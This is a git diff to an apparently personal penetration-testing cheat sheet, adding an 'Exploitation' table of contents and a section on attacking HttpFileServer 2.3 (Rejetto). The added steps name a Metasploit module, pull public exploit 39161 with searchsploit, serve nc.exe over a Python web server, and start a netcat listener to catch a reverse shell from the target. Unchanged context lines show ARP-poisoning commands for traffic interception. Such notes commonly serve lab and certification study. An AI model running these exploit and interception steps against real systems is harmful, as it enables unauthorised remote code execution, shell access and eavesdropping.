@@ -61,6 +61,10 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 
 
 # 2 Exploitation
+- [ARP Poisoning](#ARP-Poisoning)
+- [HttpFileServer 2.3 (Rejetto)](#HttpFileServer-2.3-(Rejetto))
+- 
+
 ## ARP Poisoning
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -71,6 +75,24 @@ arpspoof -i <interface> -t <ip1> -r <ip2>
 ```
 ```
 sudo wireshark -i <interface> -k
+```
+
+## HttpFileServer 2.3 (Rejetto)
+```
+use exploit/windows/http/rejetto_hfs_exec
+```
+```
+searchsploit -m 39161
+
+cd ~/Desktop
+cp /usr/share/windows-resources/binaries/nc.exe ./
+python -m SimpleHTTPServer 80
+
+vi 39161.py
+Change ip_addr and local_port accordingly for nc listener
+nc -nvlp <port>
+
+python 39161.py <ip> <port>
 ```
 
 # 3 Post-Exploitation
